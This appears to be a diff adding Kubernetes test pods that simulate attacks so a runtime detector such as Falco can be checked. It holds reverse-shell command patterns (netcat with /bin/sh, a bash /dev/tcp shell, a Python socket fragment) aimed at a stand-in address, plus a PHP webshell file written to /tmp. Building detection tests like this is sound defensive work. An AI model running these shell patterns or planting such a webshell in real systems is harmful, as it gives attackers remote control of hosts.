@@ -1,0 +1,167 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: attack-reverse-shell-nc
+  namespace: default
+  labels:
+    app: chaos-test
+    test-type: reverse-shell
+    severity: critical
+spec:
+  containers:
+  - name: attacker
+    image: alpine:3.18
+    command:
+      - sh
+      - -c
+      - |
+        echo "=== Reverse Shell Simulation ==="
+        echo "WARNING: Simulating reverse shell / C2 communication"
+        echo ""
+
+        # Install netcat
+        apk add --no-cache netcat-openbsd 2>/dev/null || echo "Cannot install netcat"
+
+        # Test 1: netcat reverse shell pattern (without actual connection)
+        echo "[Test 1] Simulating netcat reverse shell pattern"
+        echo "Command pattern: nc -e /bin/sh 10.0.0.1 4444"
+        # Don't actually execute, just log the pattern that Falco should detect
+
+        # Test 2: bash TCP connection
+        echo "[Test 2] Simulating bash TCP reverse shell pattern"
+        # Pattern: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+        bash -c 'echo "Reverse shell pattern detected"'
+
+        # Test 3: Check for common C2 tools
+        echo "[Test 3] Checking for C2 tool indicators"
+        command -v ncat && echo "ncat found"
+        command -v socat && echo "socat found"
+        command -v curl && echo "curl available"
+
+        # Test 4: Simulate encoded shell
+        echo "[Test 4] Simulating base64 encoded command execution"
+        echo "bash -c 'base64_payload'" | base64
+
+        echo ""
+        echo "Test complete. Sleeping for forensics..."
+        sleep 300
+    securityContext:
+      runAsNonRoot: true
+      runAsUser: 1000
+      allowPrivilegeEscalation: false
+      capabilities:
+        drop:
+          - ALL
+      readOnlyRootFilesystem: false
+    resources:
+      limits:
+        cpu: "100m"
+        memory: "64Mi"
+  restartPolicy: Never
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: attack-python-shell
+  namespace: default
+  labels:
+    app: chaos-test
+    test-type: python-reverse-shell
+    severity: critical
+spec:
+  containers:
+  - name: attacker
+    image: python:3.11-alpine
+    command:
+      - python3
+      - -c
+      - |
+        import subprocess
+        import time
+        import socket
+
+        print("=== Python Reverse Shell Test ===")
+        print("Simulating Python-based reverse shell patterns")
+
+        # Test pattern that Falco should detect
+        print("[Test] Python socket creation pattern")
+        # Don't actually create connection, just the pattern
+        code = '''
+        import socket,subprocess,os
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        # s.connect(("10.0.0.1",4444))
+        '''
+        print("Code pattern (not executed):", code)
+
+        # Test subprocess usage
+        print("[Test] Subprocess shell invocation")
+        result = subprocess.run(['echo', 'shell test'], capture_output=True, text=True)
+        print(result.stdout)
+
+        print("\nTest complete. Sleeping...")
+        time.sleep(300)
+    securityContext:
+      runAsNonRoot: true
+      runAsUser: 1000
+      capabilities:
+        drop:
+          - ALL
+    resources:
+      limits:
+        cpu: "100m"
+        memory: "128Mi"
+  restartPolicy: Never
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: attack-webshell
+  namespace: default
+  labels:
+    app: chaos-test
+    test-type: webshell
+    severity: critical
+spec:
+  containers:
+  - name: attacker
+    image: php:8.2-alpine
+    command:
+      - sh
+      - -c
+      - |
+        echo "=== Webshell Detection Test ==="
+
+        # Create webshell-like file pattern
+        cat > /tmp/shell.php <<'EOF'
+        <?php
+        // Common webshell patterns
+        system($_GET['cmd']);
+        exec($_POST['c']);
+        passthru($_REQUEST['command']);
+        ?>
+        EOF
+
+        echo "Webshell pattern file created: /tmp/shell.php"
+        cat /tmp/shell.php
+
+        # Don't actually start web server, just test file pattern detection
+        echo "File pattern created for detection testing"
+
+        sleep 300
+    securityContext:
+      runAsNonRoot: true
+      runAsUser: 1000
+      capabilities:
+        drop:
+          - ALL
+    resources:
+      limits:
+        cpu: "100m"
+        memory: "64Mi"
+    volumeMounts:
+      - name: tmp
+        mountPath: /tmp
+  volumes:
+    - name: tmp
+      emptyDir: {}
+  restartPolicy: Never
